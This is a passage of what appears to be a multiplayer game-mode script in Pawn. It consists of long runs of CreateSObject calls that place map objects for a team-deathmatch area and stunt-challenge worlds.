	CreateSObject(1523, 541.303040, -2717.960205, 3.717266, 0.0000, 0.0000, 180.0000);
	CreateSObject(1523, 538.284546, -2718.026611, 3.720671, 0.0000, 0.0000, 0.0000);
	CreateSObject(2517, 529.768127, -2716.230957, 3.719217, 0.0000, 0.0000, 90.0000);
	CreateSObject(2517, 529.853210, -2711.467041, 3.763929, 0.0000, 0.0000, 90.0000);
	CreateSObject(2517, 529.841309, -2706.693848, 3.822187, 0.0000, 0.0000, 90.0000);
	CreateSObject(2517, 545.979614, -2706.514404, 3.823854, 0.0000, 0.0000, 270.0000);
	CreateSObject(2517, 546.002563, -2716.124512, 3.720366, 0.0000, 0.0000, 270.0000);
	CreateSObject(2517, 546.092529, -2711.252930, 3.772963, 0.0000, 0.0000, 270.0000);
	CreateSObject(2528, 534.623230, -2705.373779, 3.844252, 0.0000, 0.0000, 0.0000);
	CreateSObject(2528, 537.920288, -2705.332520, 3.844698, 0.0000, 0.0000, 0.0000);
	CreateSObject(2528, 541.381287, -2705.376709, 3.842875, 0.0000, 0.0000, 0.0000);
	CreateSObject(993, 658.917114, -2839.021240, 6.477380, 0.0000, 0.0000, 90.0000);
	CreateSObject(993, 663.557678, -2834.290527, 6.457557, 0.0000, 0.0000, 0.0000);
	CreateSObject(1523, 668.499207, -2834.047119, 4.810595, 0.0000, 0.0000, 0.0000);
	CreateSObject(1523, 671.556702, -2834.001465, 4.798267, 0.0000, 0.0000, 180.0000);
	CreateSObject(991, 674.832886, -2833.945068, 6.012245, 0.0000, 0.0000, 180.0000);
	CreateSObject(991, 547.884460, -2708.128418, 5.030020, 0.0000, 0.0000, 90.0000);
	CreateSObject(991, 547.887695, -2714.703613, 5.033222, 0.0000, 0.0000, 90.0000);
	CreateSObject(991, 544.533447, -2717.968018, 4.996095, 0.0000, 0.0000, 0.0000);
	CreateSObject(991, 535.028198, -2717.979248, 4.923393, 0.0000, 0.0000, 0.0000);
	CreateSObject(991, 528.422119, -2717.951904, 4.898689, 0.0000, 0.0000, 0.0000);
	CreateSObject(2627, 659.853088, -2838.704346, 4.860793, 0.0000, 0.0000, 180.0000);
	CreateSObject(2628, 675.992615, -2838.765625, 4.786170, 0.0000, 0.0000, 270.0000);
	CreateSObject(2629, 670.795959, -2843.050293, 4.815722, 0.0000, 0.0000, 180.0000);
	CreateSObject(2630, 663.883484, -2843.147461, 4.837708, 0.0000, 0.0000, 180.0000);
	CreateSObject(1646, 538.624512, -2783.925781, 3.333569, 0.0000, 0.0000, 90.0000);
	CreateSObject(1646, 538.723755, -2778.336670, 3.393914, 0.0000, 0.0000, 90.0000);
	CreateSObject(1646, 538.865845, -2767.342773, 3.512612, 0.0000, 0.0000, 90.0000);
	CreateSObject(1646, 538.860962, -2762.067627, 3.569567, 0.0000, 0.0000, 90.0000);
	CreateSObject(1646, 538.972351, -2772.547852, 3.456416, 0.0000, 0.0000, 90.0000);
	CreateSObject(2631, 543.862793, -2781.107910, 3.072894, 0.0000, 0.0000, 0.0000);
	CreateSObject(2631, 543.894592, -2775.088379, 3.130893, 0.0000, 0.0000, 0.0000);
	CreateSObject(2631, 543.992920, -2769.468506, 3.198561, 0.0000, 0.0000, 0.0000);
	CreateSObject(2631, 543.975891, -2764.129395, 3.256474, 0.0000, 0.0000, 0.0000);
	CreateSObject(1645, 663.936218, -2766.675781, 3.008297, 0.0000, 0.0000, 270.0000);
	CreateSObject(1645, 663.898743, -2772.298828, 2.997120, 0.0000, 0.0000, 270.0000);
	CreateSObject(1645, 663.708130, -2777.892822, 2.986010, 0.0000, 0.0000, 270.0000);
	CreateSObject(1645, 663.923523, -2761.467773, 3.018650, 0.0000, 0.0000, 270.0000);
	CreateSObject(1645, 664.093933, -2756.111328, 3.029303, 0.0000, 0.0000, 270.0000);
	CreateSObject(2632, 658.126587, -2758.559570, 2.738957, 0.0000, 0.0000, 0.0000);
	CreateSObject(2632, 658.033386, -2764.353271, 2.727446, 0.0000, 0.0000, 0.0000);
	CreateSObject(2632, 657.846313, -2769.584229, 2.717059, 0.0000, 0.0000, 0.0000);
	CreateSObject(2632, 657.856018, -2775.256348, 2.705781, 0.0000, 0.0000, 0.0000);
	CreateSObject(11544, 638.727600, -2742.588379, 5.494272, 0.0000, 0.0000, 180.0000);
	CreateSObject(11544, 562.959961, -2742.462402, 5.400665, 0.0000, 0.0000, 180.0000);
	// TDM Heavy
	CreateSObject(4808,2040.43,3479.24,25.88,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,2040.43,3429.64,25.88,0.00,0.00,180.07,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,2159.00,3429.70,25.88,0.00,0.00,179.97,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,2159.04,3479.32,25.88,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(5509,1960.61,3499.18,25.88,0.00,0.00,269.99,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1999.95,3489.33,20.58,0.00,0.00,359.77,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(10197,2058.20,3485.37,34.05,0.00,0.00,179.78,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(10197,2058.15,3506.20,33.95,0.00,0.00,359.81,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2066.26,3487.07,-39.01,0.00,0.00,359.88,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(5509,1895.47,3523.57,25.88,0.00,0.00,180.16,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(10056,2146.20,3500.44,53.63,0.00,0.00,89.96,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9907,2096.44,3524.55,-2.49,0.00,0.00,269.81,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8555,2119.10,3415.13,48.55,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2212.51,3487.03,-39.01,0.00,0.00,359.88,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2212.50,3512.52,-39.01,0.00,0.00,359.88,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2150.00,3526.97,-39.01,0.00,0.00,359.88,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2212.55,3537.96,-39.01,0.00,0.00,359.88,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6099,2215.37,3507.83,42.23,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4571,2151.58,3557.51,25.97,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4023,2201.80,3557.93,34.21,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4602,2236.37,3533.67,87.65,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6342,2220.55,3445.62,38.57,0.00,0.00,208.92,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2165.44,3373.21,-39.17,0.00,0.00,270.23,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2121.84,3382.41,-39.17,0.00,0.00,0.26,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,2059.32,3387.22,-39.17,0.00,0.00,0.26,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(7011,2023.39,3475.45,29.88,0.00,0.00,360.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6989,2202.00,3353.95,-3.90,0.00,0.00,90.07,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9949,2124.40,3364.87,37.38,0.00,0.00,270.92,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9901,2010.32,3351.47,49.60,0.00,0.00,271.58,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4023,1986.24,3404.49,37.45,0.00,0.00,89.23,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4571,1990.16,3520.48,25.97,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1996.78,3374.43,-39.17,0.00,0.00,0.26,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1997.03,3399.87,-39.17,0.00,0.00,0.17,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1985.04,3425.27,-39.17,0.00,0.00,0.17,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(5509,1826.15,3482.43,25.87,0.00,0.00,0.21,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,1791.65,3506.49,25.90,0.00,0.00,0.20,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,1722.09,3456.71,25.90,0.00,0.00,180.28,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,1603.64,3455.97,25.90,0.00,0.00,180.38,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4808,1672.83,3505.86,25.90,0.00,0.00,0.31,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6099,1950.82,3441.19,34.43,0.00,0.00,268.83,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6989,1924.45,3442.59,-3.90,0.00,0.00,90.07,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9907,1946.16,3564.10,89.47,0.00,0.00,269.81,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1890.98,3558.37,20.58,0.00,0.00,359.77,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(7011,1826.01,3455.33,31.84,0.00,0.00,90.61,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9901,1790.79,3430.63,51.22,0.00,0.00,270.62,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6099,1820.68,3513.46,34.57,0.00,0.00,269.96,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8555,1734.02,3517.79,48.35,0.00,0.00,0.43,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1774.14,3561.98,-39.00,0.00,0.00,270.03,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1729.70,3550.32,-39.00,0.00,0.00,179.79,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1817.64,3543.68,-39.00,0.00,0.00,179.99,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1685.96,3532.50,-39.00,0.00,0.00,89.57,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4603,1670.02,3433.46,33.52,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6342,1646.96,3484.53,40.19,0.00,0.00,34.37,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4023,1664.95,3517.11,37.45,0.00,0.00,359.58,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(9949,1856.32,3549.42,36.35,0.00,0.00,134.97,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(8411,1798.30,3558.80,15.74,0.00,0.00,270.82,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(6099,1750.82,3565.77,34.43,0.00,0.00,270.75,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4601,1711.86,3617.85,37.71,0.00,0.00,91.79,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(4023,1665.09,3553.10,37.45,0.00,0.00,359.58,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11442,1686.86,3491.19,25.90,0.00,0.00,88.87,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11443,1698.00,3471.36,25.81,0.00,0.00,91.57,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3279,1730.72,3489.37,25.69,0.00,0.00,179.36,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1755.20,3474.41,27.06,0.00,0.00,88.57,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1761.50,3469.46,27.06,0.00,0.00,59.48,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1765.93,3474.42,27.06,0.00,0.00,119.79,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(967,1758.90,3491.53,25.72,0.00,0.00,90.60,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(967,1758.85,3494.09,25.72,0.00,0.00,90.60,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(967,1758.97,3488.87,25.72,0.00,0.00,90.60,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11441,1765.67,3546.08,25.98,0.00,0.00,87.85,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11441,1750.38,3542.11,25.98,0.00,0.00,87.85,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11441,1714.09,3547.40,25.98,0.00,0.00,245.87,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11445,1726.18,3542.34,25.99,0.00,0.00,270.53,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3279,1787.50,3472.15,25.69,0.00,0.00,179.36,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1781.90,3510.82,27.06,0.00,0.00,180.83,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1778.27,3519.73,27.06,0.00,0.00,196.83,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1358,1782.18,3528.65,27.06,0.00,0.00,165.34,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3566,1818.85,3495.94,28.36,0.00,0.00,89.78,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3572,1863.41,3498.10,27.14,0.00,0.00,270.35,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1672.31,3481.01,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1698.84,3481.28,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1720.71,3481.35,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1751.25,3481.51,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1787.53,3481.71,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1832.78,3481.86,31.32,0.00,0.00,89.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,1995.82,3454.43,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2029.85,3454.52,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2060.36,3454.46,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2096.86,3454.38,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2096.86,3454.38,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2138.34,3454.49,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1290,2196.56,3454.44,31.32,0.00,0.00,270.19,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1978.07,3458.51,29.87,0.00,0.00,278.87,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1946.53,3458.87,29.55,0.00,0.00,264.28,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1944.59,3481.81,29.55,0.00,0.00,178.89,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1944.75,3515.20,29.55,0.00,0.00,178.89,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1955.61,3497.51,29.55,0.00,0.00,0.59,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1922.21,3529.07,29.75,0.00,0.00,268.61,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1876.88,3528.92,29.75,0.00,0.00,268.61,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1226,1896.30,3538.90,29.95,0.00,0.00,91.41,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3279,2138.42,3445.79,26.15,0.00,0.00,359.71,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1222,1873.35,3536.26,26.27,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1222,1892.60,3531.16,26.27,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1222,1907.40,3536.33,26.27,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(1222,1924.65,3531.19,26.27,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3566,1894.41,3536.66,28.26,0.00,0.00,90.27,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3566,1953.15,3521.77,28.26,0.00,0.00,179.90,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11442,2167.74,3464.39,25.78,0.00,0.00,269.01,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11428,2116.18,3453.47,30.94,0.00,0.00,0.00,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3571,2073.91,3464.68,27.19,0.00,0.00,89.70,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(3722,2039.60,3444.19,30.06,0.00,0.00,270.68,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11445,2038.91,3393.09,25.77,0.00,0.00,270.43,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11442,2148.31,3383.35,25.82,0.00,0.00,270.52,object_show_distance,0,worlds_tdm + tdmz_heavy);
	CreateSObject(11442,2186.99,3444.38,25.78,0.00,0.00,269.01,object_show_distance,0,worlds_tdm + tdmz_heavy);
	// Extreme
	CreateSObject(18809,1745.65,-1301.77,136.19,91.00,0.00,87.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1695.96,-1299.17,137.00,91.00,0.00,87.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1695.96,-1299.17,105.19,91.00,0.00,87.00,object_show_distance,0,world_challenges);
	CreateSObject(18824,1740.37,-1311.87,104.63,-90.00,0.00,227.00,object_show_distance,0,world_challenges);
	CreateSObject(18824,1744.21,-1352.06,104.43,-90.00,0.00,144.21,object_show_distance,0,world_challenges);
	CreateSObject(18809,1702.56,-1372.51,104.79,91.00,0.00,102.90,object_show_distance,0,world_challenges);
	CreateSObject(18826,1661.12,-1298.05,121.49,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,1667.35,-1376.83,120.47,-18.00,0.00,18.71,object_show_distance,0,world_challenges);
	CreateSObject(18826,1684.84,-1363.02,151.08,13.00,0.00,193.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1649.32,-1367.44,167.00,91.00,0.00,102.90,object_show_distance,0,world_challenges);
	CreateSObject(18809,1600.84,-1379.02,167.71,91.00,0.00,103.92,object_show_distance,0,world_challenges);
	CreateSObject(18824,1508.20,-1389.87,169.09,-90.00,0.00,60.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1553.93,-1390.60,168.62,91.00,0.00,103.92,object_show_distance,0,world_challenges);
	CreateSObject(18824,1496.03,-1351.66,169.09,-90.00,0.00,335.34,object_show_distance,0,world_challenges);
	CreateSObject(18809,1533.26,-1325.39,168.62,91.00,0.00,109.52,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.93,-1321.35,168.18,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18826,1600.52,-1344.41,184.03,0.00,0.00,110.09,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.75,-1321.10,199.90,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18809,1533.08,-1325.15,200.28,91.00,0.00,109.52,object_show_distance,0,world_challenges);
	CreateSObject(18824,1495.85,-1351.42,200.68,-90.00,0.00,335.34,object_show_distance,0,world_challenges);
	CreateSObject(18824,1508.71,-1388.68,200.71,-90.00,0.00,62.90,object_show_distance,0,world_challenges);
	CreateSObject(18809,1554.98,-1388.15,200.23,91.00,0.00,103.92,object_show_distance,0,world_challenges);
	CreateSObject(18826,1588.68,-1379.29,215.62,3.00,0.00,192.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1555.07,-1387.44,231.97,91.00,0.00,106.14,object_show_distance,0,world_challenges);
	CreateSObject(18824,1508.71,-1388.68,232.22,-90.00,0.00,62.90,object_show_distance,0,world_challenges);
	CreateSObject(18824,1495.85,-1351.42,232.30,-90.00,0.00,335.34,object_show_distance,0,world_challenges);
	CreateSObject(18809,1533.08,-1325.15,231.88,91.00,0.00,109.52,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.75,-1321.10,231.30,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18826,1600.52,-1344.41,247.22,0.00,0.00,110.09,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.75,-1321.10,263.03,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18826,1546.15,-1319.64,278.88,0.00,0.00,14.67,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.75,-1321.10,294.67,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18826,1600.52,-1344.41,310.50,0.00,0.00,110.09,object_show_distance,0,world_challenges);
	CreateSObject(18824,1578.75,-1321.10,326.36,-90.00,0.00,246.31,object_show_distance,0,world_challenges);
	CreateSObject(18824,1544.51,-1331.51,337.10,-120.00,-11.00,321.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1544.77,-1390.67,335.16,-63.00,0.00,6.55,object_show_distance,0,world_challenges);
	CreateSObject(18809,1549.33,-1434.07,312.97,-63.00,0.00,5.76,object_show_distance,0,world_challenges);
	CreateSObject(18809,1553.67,-1476.62,291.15,-63.00,0.00,5.76,object_show_distance,0,world_challenges);
	CreateSObject(18844,1556.73,-1497.91,275.27,-58.00,0.00,7.10,object_show_distance,0,world_challenges);
	CreateSObject(18809,1558.86,-1518.29,265.22,-53.00,0.00,8.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1565.65,-1557.04,235.54,-53.00,0.00,11.74,object_show_distance,0,world_challenges);
	CreateSObject(18826,1571.95,-1582.83,205.46,3.00,0.00,110.94,object_show_distance,0,world_challenges);
	CreateSObject(18809,1560.40,-1550.18,190.15,91.00,0.00,16.97,object_show_distance,0,world_challenges);
	CreateSObject(18824,1557.48,-1504.18,190.69,-90.00,0.00,336.61,object_show_distance,0,world_challenges);
	CreateSObject(18809,1592.27,-1474.65,190.25,91.00,0.00,117.78,object_show_distance,0,world_challenges);
	CreateSObject(18809,1635.48,-1451.95,189.54,91.00,0.00,117.78,object_show_distance,0,world_challenges);
	CreateSObject(18809,1679.13,-1429.02,188.88,91.00,0.00,117.78,object_show_distance,0,world_challenges);
	CreateSObject(18809,1722.23,-1406.30,188.16,91.00,0.00,117.98,object_show_distance,0,world_challenges);
	CreateSObject(18809,1764.96,-1383.68,187.44,91.00,0.00,117.98,object_show_distance,0,world_challenges);
	CreateSObject(18835,1808.02,-1302.07,175.48,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18824,1764.11,-1377.87,218.73,-90.00,0.00,91.10,object_show_distance,0,world_challenges);
	CreateSObject(18826,1794.07,-1366.24,202.83,0.00,0.00,218.12,object_show_distance,0,world_challenges);
	CreateSObject(18824,1754.71,-1315.25,218.71,-90.00,0.00,295.35,object_show_distance,0,world_challenges);
	CreateSObject(18830,1833.03,-1302.51,136.25,91.00,0.00,98.93,object_show_distance,0,world_challenges);
	CreateSObject(18830,1825.14,-1287.38,136.35,91.00,0.00,137.79,object_show_distance,0,world_challenges);
	CreateSObject(18830,1827.42,-1314.95,135.90,91.00,0.00,1.29,object_show_distance,0,world_challenges);
	CreateSObject(18830,1827.42,-1314.95,135.90,91.00,0.00,36.21,object_show_distance,0,world_challenges);
	CreateSObject(18830,1812.16,-1288.03,136.35,91.00,0.00,199.22,object_show_distance,0,world_challenges);
	CreateSObject(18830,1754.81,-1272.93,226.56,91.00,0.00,228.92,object_show_distance,0,world_challenges);
	CreateSObject(18830,1786.56,-1296.20,136.35,91.00,0.00,182.39,object_show_distance,0,world_challenges);
	CreateSObject(18830,1816.84,-1313.49,135.90,91.00,0.00,346.16,object_show_distance,0,world_challenges);
	CreateSObject(18761,1789.63,-1303.09,139.79,0.00,0.00,274.60,object_show_distance,0,world_challenges);
	CreateSObject(18658,1808.56,-1302.16,201.74,-91.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18646,1787.20,-1303.52,130.70,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18646,1818.80,-1300.27,130.70,0.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18846,1769.00,-1302.96,145.92,0.00,0.00,89.38,object_show_distance,0,world_challenges);
	CreateSObject(18830,1786.23,-1310.06,135.90,91.00,0.00,1.29,object_show_distance,0,world_challenges);
	CreateSObject(18824,1734.53,-1351.29,218.71,-90.00,0.00,5.39,object_show_distance,0,world_challenges);
	// Extreme 2
	CreateSObject(18809,1264.28,-2070.63,63.39,90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.29,-2120.35,63.36,-90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1264.27,-2466.69,110.61,90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1125.75,-2522.99,110.59,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18809,1264.25,-2366.60,76.27,84.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.26,-2317.15,71.07,-96.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1365.78,-2210.31,59.55,84.00,0.00,190.66,object_show_distance,0,world_challenges);
	CreateSObject(18842,1264.30,-2219.83,63.36,-90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18809,1264.31,-2170.30,63.39,90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18841,1264.33,-2501.90,94.80,0.00,0.00,90.45,object_show_distance,0,world_challenges);
	CreateSObject(18809,1209.20,-2358.50,52.48,90.00,0.00,268.65,object_show_distance,0,world_challenges);
	CreateSObject(18841,1248.56,-2430.89,110.60,90.00,0.00,268.89,object_show_distance,0,world_challenges);
	CreateSObject(18809,1175.39,-2521.94,110.61,90.00,0.00,271.13,object_show_distance,0,world_challenges);
	CreateSObject(18840,828.57,-2488.97,108.61,90.00,0.00,48.29,object_show_distance,0,world_challenges);
	CreateSObject(18809,1232.46,-2465.63,110.61,90.00,0.00,0.00,object_show_distance,0,world_challenges);
	CreateSObject(18842,1259.08,-2359.76,52.48,-90.00,0.00,268.47,object_show_distance,0,world_challenges);
	CreateSObject(18809,1075.87,-2524.06,110.59,90.00,0.00,271.13,object_show_distance,0,world_challenges);
	CreateSObject(18842,925.88,-2495.43,108.60,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18826,990.79,-2521.16,125.70,-18.00,0.00,2.00,object_show_distance,0,world_challenges);
	CreateSObject(18841,1011.30,-2512.47,125.32,-11.00,0.00,182.00,object_show_distance,0,world_challenges);
	CreateSObject(18826,990.11,-2505.21,124.76,-18.00,0.00,2.00,object_show_distance,0,world_challenges);
	CreateSObject(18841,966.09,-2308.28,123.54,-11.00,0.00,178.11,object_show_distance,0,world_challenges);
	CreateSObject(18809,975.71,-2494.35,108.62,90.00,0.00,271.13,object_show_distance,0,world_challenges);
	CreateSObject(18842,1026.05,-2525.13,110.59,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18809,876.52,-2496.49,108.62,90.00,0.00,271.13,object_show_distance,0,world_challenges);
	CreateSObject(18840,1222.76,-2512.53,110.62,90.00,0.00,133.98,object_show_distance,0,world_challenges);
	CreateSObject(18824,828.99,-2446.87,108.26,89.00,0.00,317.96,object_show_distance,0,world_challenges);
	CreateSObject(18842,1021.22,-2377.80,139.04,-90.00,0.00,271.32,object_show_distance,0,world_challenges);
	CreateSObject(18809,973.09,-2376.32,139.05,90.00,0.00,265.05,object_show_distance,0,world_challenges);
	CreateSObject(18841,1010.69,-2496.56,124.27,-11.00,0.00,182.00,object_show_distance,0,world_challenges);
	CreateSObject(18855,920.65,-2338.89,139.10,-90.00,0.00,353.31,object_show_distance,0,world_challenges);
	CreateSObject(18855,921.09,-2332.84,107.92,-90.00,0.00,353.31,object_show_distance,0,world_challenges);
	CreateSObject(18855,979.51,-2400.72,107.90,-90.00,0.00,178.52,object_show_distance,0,world_challenges);
